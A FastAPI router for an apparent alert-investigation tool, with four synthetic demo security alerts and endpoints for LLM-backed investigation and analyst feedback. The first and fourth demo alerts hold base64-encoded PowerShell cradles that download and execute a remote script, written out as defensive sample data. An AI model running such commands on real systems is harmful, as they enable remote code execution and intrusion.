from fastapi import APIRouter, HTTPException, Depends
from typing import List, Dict, Any
from backend.app.schemas.alert import AlertInput, DemoAlert
from backend.app.schemas.investigation import InvestigationResult
from backend.app.schemas.feedback import FeedbackInput, FeedbackResponse
from backend.app.services.investigation_service import investigation_service
from backend.app.services.feedback_service import feedback_service
from backend.app.models.database import SessionLocal, AlertRecord, InvestigationRecord, FeedbackRecord

router = APIRouter(prefix="/alerts", tags=["Alerts"])

PREBUILT_DEMO_ALERTS: List[DemoAlert] = [
    DemoAlert(
        id="demo-1",
        name="Phishing Document Macro (ALT-1042)",
        description="High-severity alert: winword.exe spawning obfuscated PowerShell with external C2 beaconing.",
        category="Initial Access & Execution",
        expected_behavior="Recalls INC-0037 and INC-0081. Recommends immediate host isolation.",
        alert=AlertInput(
            alert_id="ALT-1042",
            host="FINANCE-PC-17",
            severity="HIGH",
            process="powershell.exe",
            parent_process="winword.exe",
            command="powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAHAAJwApAA==",
            destination="185.220.101.5:443",
            timestamp="2026-09-28 14:32:00",
            user="CORP\\jsmith",
            raw_log="EventID: 4688 | NewProcessName: powershell.exe | ParentProcessName: winword.exe | CommandLine: powershell.exe -enc ... | Host: FINANCE-PC-17"
        )
    ),
    DemoAlert(
        id="demo-2",
        name="Enterprise Backup Archiver Alert (ALT-1088)",
        description="Suspicious alert triggered by scheduled document archiver script under winword.exe.",
        category="Potential False Positive",
        expected_behavior="Recalls INC-0052. Contextual assessment identifies authorized archiving path.",
        alert=AlertInput(
            alert_id="ALT-1088",
            host="BACKUP-SRV-01",
            severity="MEDIUM",
            process="powershell.exe",
            parent_process="winword.exe",
            command="powershell.exe -ExecutionPolicy RemoteSigned -File C:\\EnterpriseBackup\\scripts\\doc_archiver.ps1 -Target C:\\Docs",
            destination="10.14.20.5:445",
            timestamp="2026-09-28 15:10:00",
            user="CORP\\svc_backup",
            raw_log="EventID: 4688 | NewProcessName: powershell.exe | CommandLine: -File C:\\EnterpriseBackup\\scripts\\doc_archiver.ps1"
        )
    ),
    DemoAlert(
        id="demo-3",
        name="Finance Template Sync (ALT-1140)",
        description="PowerShell spawned by Word on finance host referencing EnterpriseDocGen namespace.",
        category="Learning Verification",
        expected_behavior="Recalls prior analyst feedback and INC-0163. Avoids false quarantine.",
        alert=AlertInput(
            alert_id="ALT-1140",
            host="FINANCE-PC-18",
            severity="HIGH",
            process="powershell.exe",
            parent_process="winword.exe",
            command="powershell.exe -ExecutionPolicy Bypass -Command & { [EnterpriseDocGen.Tool]::SyncTemplate('finance_q4_budget') }",
            destination="10.20.30.40:443",
            timestamp="2026-09-28 16:05:00",
            user="CORP\\tgreene",
            raw_log="EventID: 4688 | Process: powershell.exe | Parent: winword.exe | Target: 10.20.30.40"
        )
    ),
    DemoAlert(
        id="demo-4",
        name="Cobalt Strike C2 Beacon (ALT-1105)",
        description="Critical Cobalt Strike payload communicating over encrypted tunnel.",
        category="Command & Control",
        expected_behavior="Recalls INC-0147. Confirms active adversary campaign and mandates immediate remediation.",
        alert=AlertInput(
            alert_id="ALT-1105",
            host="HR-WORKSTATION-12",
            severity="CRITICAL",
            process="powershell.exe",
            parent_process="explorer.exe",
            command="powershell.exe -nop -w hidden -e aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACk...",
            destination="203.0.113.199:443",
            timestamp="2026-09-28 16:45:00",
            user="CORP\\mlee",
            raw_log="EventID: 4688 | Beacon interval 45s jitter 20% | Destination: 203.0.113.199:443"
        )
    )
]

@router.get("/prebuilt", response_model=List[DemoAlert])
def get_prebuilt_alerts():
    """Returns curated synthetic alerts for rapid demonstration."""
    return PREBUILT_DEMO_ALERTS

@router.post("/investigate", response_model=InvestigationResult)
def investigate_alert(alert: AlertInput):
    """
    Core investigation pipeline:
    1. Parse alert
    2. Construct Hindsight memory query
    3. Recall historical memories
    4. Synthesize investigation with LLM
    5. Return structured result distinguishing current evidence from memory.
    """
    try:
        return investigation_service.investigate(alert)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Investigation failed: {str(e)}")

@router.post("/feedback", response_model=FeedbackResponse)
def submit_feedback(feedback: FeedbackInput):
    """
    Submits analyst feedback and retains it directly into Hindsight long-term memory.
    """
    try:
        return feedback_service.process_feedback(feedback)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Feedback submission failed: {str(e)}")
